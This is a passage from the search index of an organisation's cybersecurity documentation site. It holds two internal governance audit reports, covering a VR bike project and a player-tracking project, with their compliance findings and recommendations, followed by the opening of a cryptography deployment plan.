Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#general-audit-points---policy-compliance","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Are the correct encryption methods being used for data in storage and transmission?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#11-are-the-correct-encryption-methods-being-used-for-data-in-storage-and-transmission","content":" Compliant: NoObservations: Very minimal data is stored; encryption not necessary at this stage.Action Required: None required for now, but encryption should be considered in future.  ","version":"Next","tagName":"h3"},{"title":"1.2 Are the related DLP Policies being adhered to?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#12-are-the-related-dlp-policies-being-adhered-to","content":" Compliant: NoObservations: Data is uploaded to GitHub and Microsoft Teams with no encryption. No formal backup plan.Action Required: Consider data protection policies for better data integrity.  ","version":"Next","tagName":"h3"},{"title":"1.3 Are the related Data Classification Policies being adhered to?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#13-are-the-related-data-classification-policies-being-adhered-to","content":" Compliant: NoObservations: All data created by the team is publicly accessible.Action Required: Implement access restrictions to control who can view and edit data.  ","version":"Next","tagName":"h3"},{"title":"1.4 Have forms of physical security for data protection been implemented?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#14-have-forms-of-physical-security-for-data-protection-been-implemented","content":" Compliant: NoObservations: No physical security measures have been implemented.Action Required: None for now, but it should be considered for customer data collection.  ","version":"Next","tagName":"h3"},{"title":"1.5 Have forms of digital security for data protection been implemented?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#15-have-forms-of-digital-security-for-data-protection-been-implemented","content":" Compliant: NoObservations: No digital security measures in place.Action Required: Should be considered in future for customer data protection.  ","version":"Next","tagName":"h3"},{"title":"1.6 Have EASM risks been identified?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#16-have-easm-risks-been-identified","content":" Compliant: NoObservations: EASM risks have not been considered.Action Required: Need to assess potential risks and threats related to EASM.  ","version":"Next","tagName":"h3"},{"title":"1.7 Have all employees undergone the appropriate User Awareness Training?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#17-have-all-employees-undergone-the-appropriate-user-awareness-training","content":" Compliant: NoObservations: Training has not been a priority so far.Action Required: Mandatory awareness training required as data collection becomes more prominent.    ","version":"Next","tagName":"h3"},{"title":"GENERAL AUDIT POINTS - Ethical Considerations and Requirements​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#general-audit-points---ethical-considerations-and-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Are all forms of data collection briefed with customers and consent gathered?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#21-are-all-forms-of-data-collection-briefed-with-customers-and-consent-gathered","content":" Compliant: NAObservations: No customer data collection has started.Action Required: None.  ","version":"Next","tagName":"h3"},{"title":"2.2 Has all collected information and data been classified with data classification requirements?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#22-has-all-collected-information-and-data-been-classified-with-data-classification-requirements","content":" Compliant: NAAction Required: None.  ","version":"Next","tagName":"h3"},{"title":"2.3 Is data anonymity used to protect the privacy of customers?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#23-is-data-anonymity-used-to-protect-the-privacy-of-customers","content":" Compliant: NAAction Required: None.  ","version":"Next","tagName":"h3"},{"title":"2.4 Is the cryptography policy being adhered to?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#24-is-the-cryptography-policy-being-adhered-to","content":" Compliant: NAObservations: No data currently requires encryption.Action Required: None.  ","version":"Next","tagName":"h3"},{"title":"2.5 Is data minimization being put in place when collecting data?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#25-is-data-minimization-being-put-in-place-when-collecting-data","content":" Compliant: NAAction Required: None.  ","version":"Next","tagName":"h3"},{"title":"2.6 Are ISMS policies being adhered to when required?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#26-are-isms-policies-being-adhered-to-when-required","content":" Compliant: NAAction Required: None.    ","version":"Next","tagName":"h3"},{"title":"GENERAL AUDIT POINTS - Governance​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#general-audit-points---governance","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Is the team adhering to the company’s governance framework?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#31-is-the-team-adhering-to-the-companys-governance-framework","content":" Compliant: NAAction Required: None.  ","version":"Next","tagName":"h3"},{"title":"3.2 Are team roles and responsibilities clearly defined and documented?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#32-are-team-roles-and-responsibilities-clearly-defined-and-documented","content":" Compliant: YesObservations: Team roles are divided between software, hardware, and mobile development.Action Required: None.  ","version":"Next","tagName":"h3"},{"title":"3.3 Is there a risk management plan in place?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#33-is-there-a-risk-management-plan-in-place","content":" Compliant: NoObservations: No risk management plan is in place.Action Required: Consider creating a risk management plan, especially as data collection becomes a focus.  ","version":"Next","tagName":"h3"},{"title":"3.4 Is there an incident response plan in place?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#34-is-there-an-incident-response-plan-in-place","content":" Compliant: NoAction Required: A risk management plan should also include incident response procedures.  ","version":"Next","tagName":"h3"},{"title":"3.5 Are incidents logged and reviewed for continuous improvement?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#35-are-incidents-logged-and-reviewed-for-continuous-improvement","content":" Compliant: NoAction Required: Consider logging and reviewing incidents as part of future plans.    ","version":"Next","tagName":"h3"},{"title":"PROJECT-SPECIFIC AUDIT POINTS​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#project-specific-audit-points","content":" ","version":"Next","tagName":"h2"},{"title":"4.1 How reliable are the hardware components of the project?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#41-how-reliable-are-the-hardware-components-of-the-project","content":" Compliant: YesObservations: Hardware components have been performing reliably.Action Required: None.  ","version":"Next","tagName":"h3"},{"title":"4.2 Are there any challenges with integrating software and hardware?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#42-are-there-any-challenges-with-integrating-software-and-hardware","content":" Compliant: YesObservations: Some initial challenges, but improvements have been made.Action Required: None.  ","version":"Next","tagName":"h3"},{"title":"4.3 Are there limitations from the hardware or software being used?​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#43-are-there-limitations-from-the-hardware-or-software-being-used","content":" Compliant: YesObservations: Minimal limitations; team has significant experience with both hardware and software.Action Required: Ensure new team members receive proper training.    ","version":"Next","tagName":"h3"},{"title":"Key Findings & Recommendations​","type":1,"pageTitle":"VR Sun Cycle Audit Report - September 2024","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Vr-Sun-Cycle-Audit#key-findings--recommendations","content":" From this Audit, it has been made clear that the project team has not seen data protection and cyber security policies as a priority at this time. However, the team must soon begin to investigate this matter more as in the future customer data collection is going to be a more common task throughout the project.  As the team hasn’t seen much need or use for incorporating data protection into their project as data collection and storing is at a minimum, the team will need to gain an understanding of all the cyber security and data protection policies as they move forward with their project into the development of their mobile application.  Starting with policy compliance, this is an area that the team isn’t very familiar with as they haven’t had the need to comply with all the policies regarding data protection as currently, they don’t collect a whole lot of data. However, with the team moving forward into the following semesters, the plan to develop a new web application in corporation with their development on the Vr Bike, they would need to start to seriously consider and familiarize themselves with all the policies as customer data collection is going to be a much more prevalent procedure throughout their project. With the project delving more into data collection in the upcoming semesters, I’d strongly recommend that the entire team becomes familiar with the policies of data collection and some tasks should be included that train the team on how to comply with all these policies.  Moving onto ethical considerations, this is a similar situation to the policy compliance where it doesn’t relate too much to what is currently being conducted within the VR sun cycle smart bike team, however as data collection does become more prevalent in the upcoming semesters, it is important that the team is trained on how to understand and comply with all the ethical considerations for data collection.  Additionally, with the governance section of the audit, this is something that the team hasn’t investigated at all as well considering that their focus has been on the development of the hardware and software of the project, and their primary goal is for project functionality. Due to this, a lot of the governance and ethical considerations have been overlooked by the team however it is a goal for them to put a lot more focus in the coming semesters. My recommendations for this are to ensure that all governance policies are understood by the team before any customer data collection occurs.  Finally, going into more of the project-specific area, this is where the project has focused a lot of their time as the overall functionality of the software and hardware has been their primary goal. With the amount of time that the team has spent on the hardware specific points, this is the point where the team has been thriving the most as they have found very minimal limitations with the hardware and overall software that is being used. As a result of their success with this part of the project, it now gives them the time to focus on other parts of their project.  Overall, the team has been quite successful with the development of their project as majority of their goals for this semester have been achieved with minimal setbacks. However, with data collection becoming their next goal due to the development of their application, the team will need to be trained and become well accustomed to all the different governance policies and ethical considerations when collecting any types of data for their project.    Summary of Actions Required:  Implement encryption and data protection as the project evolves.Conduct mandatory User Awareness Training for team members.Develop a risk management and incident response plan. ","version":"Next","tagName":"h2"},{"title":"Project 4 - Player Tracking Audit Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit","content":"","keywords":"","version":"Next"},{"title":"Section 1 – Policy Compliance​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#section-1--policy-compliance","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Are the correct encryption methods being used for data in storage and transmission?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#11-are-the-correct-encryption-methods-being-used-for-data-in-storage-and-transmission","content":" Compliant  No  Observations / Comments  API Key used to access data, data is not encrypted. Github not encrypted. IP Camera in use for live tracking MicroSD flash card used for storage, not keeping historic data.  Recommendation / Action Required  Investigate data encryption options for the data stored in databases (eg MongoDB) and the Github Repo.  ","version":"Next","tagName":"h3"},{"title":"1.2 Are the related DLP Policies being adhered to?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#12-are-the-related-dlp-policies-being-adhered-to","content":" Compliant  No  Observations / Comments  Access Control – All team members using account to access Database  Encryption – not used  Watermarking – Logo in Database but no other watermarking  Recommendation / Action Required  Implement better access control including individual accounts instead of shared. Control access to database by implementing proper user management. Investigate Watermarking data in storage.  ","version":"Next","tagName":"h3"},{"title":"1.3 Are the related Data Classification Policies being adhered to?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#13-are-the-related-data-classification-policies-being-adhered-to","content":" Compliant  No  Observations / Comments  No data classification happening. Known sensitive data stored including Facial detection data stored in database, this data is not ranked by sensitivity.  Recommendation / Action Required  Run a data discovery project to identify and classify sensitive data, critical data and other forms of data. Since it is known there is sensitive data being stored, classifying this should be done as soon as possible.  ","version":"Next","tagName":"h3"},{"title":"1.4 Have forms of physical security for data protection been implemented?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#14-have-forms-of-physical-security-for-data-protection-been-implemented","content":" Compliant  N/A / NO  Observations / Comments  No physical security for data, IP camera used but property of individual team member. IP camera planned to be physically put in place when program is implemented.  Recommendation / Action Required  While there is limited physical infrastructure in use, security of the physical ip camera should be considered.  ","version":"Next","tagName":"h3"},{"title":"1.5 Have forms of digital security for data protection been implemented?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#15-have-forms-of-digital-security-for-data-protection-been-implemented","content":" Compliant  Yes / Somewhat  Observations / Comments  Notification have been setup if people access database, emails team leaders if people access/use database/account.  Recommendation / Action Required  While limited controls have been implemented, significantly greater controls are needed.  ","version":"Next","tagName":"h3"},{"title":"1.6 Have EASM Risks been identified?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#16-have-easm-risks-been-identified","content":" Compliant  No  Observations / Comments  No EASM risks identified as project team unaware of EASM and related EASM policy.  Recommendation / Action Required  Project team need to make themselves aware of the EASM policy and identify any risks.  ","version":"Next","tagName":"h3"},{"title":"1.7 Have appropriate EASM risk management strategies been implemented?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#17-have-appropriate-easm-risk-management-strategies-been-implemented","content":" Compliant  No  Observations / Comments  No EASM risks identified therefore no mitigation strategies have been implemented.  Recommendation / Action Required  Once project team have identified any EASM risks, they should implement mitigation strategies as per the EASM policy.  ","version":"Next","tagName":"h3"},{"title":"1.8 Have all employees undergone the appropriate User Awareness Training?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#18-have-all-employees-undergone-the-appropriate-user-awareness-training","content":" Compliant  No  Observations / Comments  No training has been undertaken by any member of the project team.  Recommendation / Action Required  Cyber Security team should develop user awareness training and deliver it to the Project 4 team.  ","version":"Next","tagName":"h3"},{"title":"Section 2 – Ethical Considerations and Requirements​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#section-2--ethical-considerations-and-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Are all forms of data collection briefed with customers, and consent is gathered?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#21-are-all-forms-of-data-collection-briefed-with-customers-and-consent-is-gathered","content":" Compliant  No  Observations / Comments  No consent gathered, but did gather information to use the data. Clients not briefed or consent provided. Will have notification/consent before innofest as plans to use in room with clients inside.  Recommendation / Action Required  Project Team should develop a consent form to be signed by all clients/customers whose data will be collected. This should be completed prior to InnoFest.  ","version":"Next","tagName":"h3"},{"title":"2.2 Has all collected information and data been classified with data classification requirements?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#22-has-all-collected-information-and-data-been-classified-with-data-classification-requirements","content":" Compliant  No  Observations / Comments  No, data has not been classified as per data classification question above.  Recommendation / Action Required  Processes should be put in place to classify data at the point of entry for all new future data.  ","version":"Next","tagName":"h3"},{"title":"2.3 Is data anonymity used to protect the privacy of customers?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#23-is-data-anonymity-used-to-protect-the-privacy-of-customers","content":" Compliant  No  Observations / Comments  No anonymity added to data, all data is stored in plain text.  Recommendation / Action Required  Investigate data anonymisers and look to implement across all stored and collected personal or sensitive data.  ","version":"Next","tagName":"h3"},{"title":"2.4 Is the cryptography policy being adhered to?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#24-is-the-cryptography-policy-being-adhered-to","content":" Compliant  No  Observations / Comments  No as no data is being encrypted, policy is not being adhered to.  Recommendation / Action Required  Project team should make themselves aware of the cryptography policy and implement data encryption techniques on all stored data where required.  ","version":"Next","tagName":"h3"},{"title":"2.5 Is data minimalization being put in place when collecting data?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#25-is-data-minimalization-being-put-in-place-when-collecting-data","content":" Compliant  No  Observations / Comments  No all data is collected initially, however some minimalization occurs afterwards, this is more from a storage/simplicity perspective and less due to privacy or ethical considerations.  Recommendation / Action Required  Investigate and implement data minimalization techniques when collecting data. Ensure project team is aware of the importance of minimizing the collection of sensitive/personal data.  ","version":"Next","tagName":"h3"},{"title":"2.6 Looping back to the ISMS policies, are they being adhered to when required?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#26-looping-back-to-the-isms-policies-are-they-being-adhered-to-when-required","content":" Compliant  No  Observations / Comments  As project team are unaware of ISMS policies, it has not been a consideration to understand or comply with them. Therefore none are being adhered to.  Recommendation / Action Required  Project team need to make themselves aware of the ISMS policies, identify where they are applicable to their project and implement requirements of each policy as required.  ","version":"Next","tagName":"h3"},{"title":"Section 3 – Governance​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#section-3--governance","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Is the team adhering to the company’s governance framework?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#31-is-the-team-adhering-to-the-companys-governance-framework","content":" Compliant  No  Observations / Comments  Project team unaware of any governance framework.  Recommendation / Action Required  Project team need to make themselves aware of the governance framework and adhere as required.  ","version":"Next","tagName":"h3"},{"title":"3.2 Are team roles and responsibilities clearly defined and documented?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#32-are-team-roles-and-responsibilities-clearly-defined-and-documented","content":" Compliant  Yes  Observations / Comments  Team roles and responsibilities are clearly documented, therefore these could be adapted to fit the role and responsibility requirements of the governance framework and the ISMS policies.  Recommendation / Action Required  N/A  ","version":"Next","tagName":"h3"},{"title":"3.3 Is there a risk management plan in place?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#33-is-there-a-risk-management-plan-in-place","content":" Compliant  No  Observations / Comments  No risk management plan in place.  Recommendation / Action Required  Project / Cyber Security team needs to investigate and build a risk management framework and plan.  ","version":"Next","tagName":"h3"},{"title":"3.4 Is there an incident response plan in place?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#34-is-there-an-incident-response-plan-in-place","content":" Compliant  No  Observations / Comments  No incident response plan in place.  Recommendation / Action Required  Project / Cyber Security team needs to investigate and build a project specific incident response plan that can be followed specifically by each project.  ","version":"Next","tagName":"h3"},{"title":"3.4 Are incidents logged and reviewed for continuous improvement?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#34-are-incidents-logged-and-reviewed-for-continuous-improvement","content":" Compliant  No  Observations / Comments  No previous incidents logged and no incident response framework or processes to log incidents.  Recommendation / Action Required  Build incident response plan and implement incident logging procedures to ensure all future incidents are adequately logged and reviewed.  ","version":"Next","tagName":"h3"},{"title":"Section 4 – Project Specific Audit​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#section-4--project-specific-audit","content":" ","version":"Next","tagName":"h2"},{"title":"4.1 Are all end-user devices up to date with the latest security software?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#41-are-all-end-user-devices-up-to-date-with-the-latest-security-software","content":" Compliant  Yes  Observations / Comments  According to project lead, all end user devices are currently up to date. The only applicable device is the projects IP camera.  Recommendation / Action Required  N/A  ","version":"Next","tagName":"h3"},{"title":"4.2 Do you have a process for updating and patching these systems regularly?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#42-do-you-have-a-process-for-updating-and-patching-these-systems-regularly","content":" Compliant  No  Observations / Comments  No current patch management processes or procedures. Patching is done on an ad-hoc basis.  Recommendation / Action Required  Build and maintain a patch management policy and procedures to ensure all devices are kept up to date in order to mitigate vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"4.3 Is the server-security policy being actively adhered to for all networks?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#43-is-the-server-security-policy-being-actively-adhered-to-for-all-networks","content":" Compliant  N/A  Observations / Comments  Not applicable, no network or servers in use.  Recommendation / Action Required  N/A  ","version":"Next","tagName":"h3"},{"title":"4.4 Have Key assets and Data Categories been identified and organised correctly in relevance to the Monitoring & Log Analytics Policy​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#44-have-key-assets-and-data-categories-been-identified-and-organised-correctly-in-relevance-to-the-monitoring--log-analytics-policy","content":" Compliant  No  Observations / Comments  No key assets or data categories identified.  Recommendation / Action Required  Project team to investigate monitoring and log analytics policy and build documentation identifying key assets and data categories.  ","version":"Next","tagName":"h3"},{"title":"4.5 What is your approach/policy with managing passwords required within your project team?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#45-what-is-your-approachpolicy-with-managing-passwords-required-within-your-project-team","content":" Compliant  No  Observations / Comments  Text passwords to team members. Team leaders know the password and can send to other team members.  Recommendation / Action Required  Implement proper password management solution, potentially systems such as a enterprise password manager. Additionally, ensure best practice is followed and passwords are changed and managed appropriately when team members leave the project in order to ensure proper access control to data and systems.  ","version":"Next","tagName":"h3"},{"title":"4.6 Do you use multi-factor authentication for any systems you use within your project?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#46-do-you-use-multi-factor-authentication-for-any-systems-you-use-within-your-project","content":" Compliant  No  Observations / Comments  No MFA enabled, Single factor in use for all accounts  Recommendation / Action Required  Implement MFA for all systems where possible. If current systems do not have MFA capability then it is recommended to move away and utilise only MFA capable systems.  ","version":"Next","tagName":"h3"},{"title":"4.7 Do you train your project team members in cybersecurity and best practice?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#47-do-you-train-your-project-team-members-in-cybersecurity-and-best-practice","content":" Compliant  No  Observations / Comments  No training delivered around security.  Recommendation / Action Required  Investigate and deliver cyber security best practice training to all team members, this should include topics such as password management, multi-factor authentication, data storage best practice, data privacy and consent.  ","version":"Next","tagName":"h3"},{"title":"4.8 What steps would you take if a cyber related incident was discovered?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#48-what-steps-would-you-take-if-a-cyber-related-incident-was-discovered","content":" Compliant  No  Observations / Comments  In the example of a breached database shared account, the following response was given:  Lock the account, remove that user, notify the team and ask if they have given access or password.  Recommendation / Action Required  Investigate incident response plan to address issues here, key aspects where missed including notifying company leadership, building an incident response team and logging and reviewing incident post recovery.  ","version":"Next","tagName":"h3"},{"title":"4.9 Are previous incidents documented or noted anywhere?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#49-are-previous-incidents-documented-or-noted-anywhere","content":" Compliant  No / N/A  Observations / Comments  As the project lead is unaware of any past incidents, there is no documentation or logs.  Recommendation / Action Required  While there is no documented incidents, we can not rule out previous cyber incidents as the project is non-compliant with the incident response and logging procedures.  ","version":"Next","tagName":"h3"},{"title":"4.10 What is your process for backing up data and how frequent are these backups performed?​","type":1,"pageTitle":"Project 4 - Player Tracking Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Player-Tracking-Audit#410-what-is-your-process-for-backing-up-data-and-how-frequent-are-these-backups-performed","content":" Compliant  Yes  Observations / Comments  Data is backed up on GitHub, once a week.  Recommendation / Action Required  While this does meet compliance requirements. There should be further processes around access to backed up data to ensure immutability, and backups of all systems and data stored should be investigated and implemented.  Findings &amp; Conclusion  Overall findings indicate that Project 4 – Player Tracking is non-compliant with the majority of audit points. Breakdown is as follows:  4 Compliant Audit Points  23 Non-compliant Audit Points  3 Not applicable Audit points  Therefore, it is my strong recommendation that the recommended actions listed for each audit point in this report be actioned as soon as possible.  Many of the non-compliant audit points are due to a lack of knowledge or awareness of the cyber security policies, procedures and frameworks built and implemented by the Redback Operations Team. I feel many of the shortcomings addressed in this report could be addressed by better education and awareness of these policies and frameworks within the projects and team outside of the direct cyber team.  A prospective idea that Vincent and I discussed was assigning a member of the cyber security team to each specific project for a trimester, this way that team member could work with the projects to build awareness and understanding of these policies, uplift their cyber security posture and deliver on many of the recommendations provided by the cyber audits the GRC team has completed this trimester.  Overall, the experience of completing this audit has been highly rewarding from both the perspective of the GRC/Cyber Security Team and the individual projects outside of this. I feel it has helped build awareness of the ever increasing risks of cyber security, and the strong emphasis that should be placed on ensuring compliance with the companies cyber security policies and frameworks, across all projects and teams within Redback Operations. I hope the results of these audits are built upon in future trimesters and can act as a gap analysis for future cyber security team members to uplift compliance within the projects. ","version":"Next","tagName":"h3"},{"title":"Deployment Plan for Cryptography - Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Deployment-Plan","content":"","keywords":"","version":"Next"},{"title":"Weeks 1-4: Initial Analysis and Training​","type":1,"pageTitle":"Deployment Plan for Cryptography - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Deployment-Plan#weeks-1-4-initial-analysis-and-training","content":" For cryptography to be successfully deployed into the redback operations, the teams must analyse where there is a need for cryptography, and which areas would need it the most. In the opening weeks of the coming semesters, it would be vital for:  All teams to analyse their data collection and determine whether there is a need for any cryptography methods to be used within their teams. This can also be seen from the audits which were conducted on each of the projects which had analysed their data collection.All teams to ensure that there is a company wide understanding of how important data protection is, so training on data protection/collection should be provided. As the audits have already been completed on the current teams, it would be a quick process for the company to analyse those existing audits and provide training to current team members on data protection to decide whether any data protection is needed.    ","version":"Next","tagName":"h2"},{"title":"Weeks 5-7: Software Selection and Testing​","type":1,"pageTitle":"Deployment Plan for Cryptography - Redback Operations","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Cryptography-Deployment-Plan#weeks-5-7-software-selection-and-testing","content":" From the work conducted through weeks 1 through 4, there should be an understanding on if data protection is needed, and where it would be needed to be implemented. Going forward into the middle of the semester, now it would be important to:  Look through all the 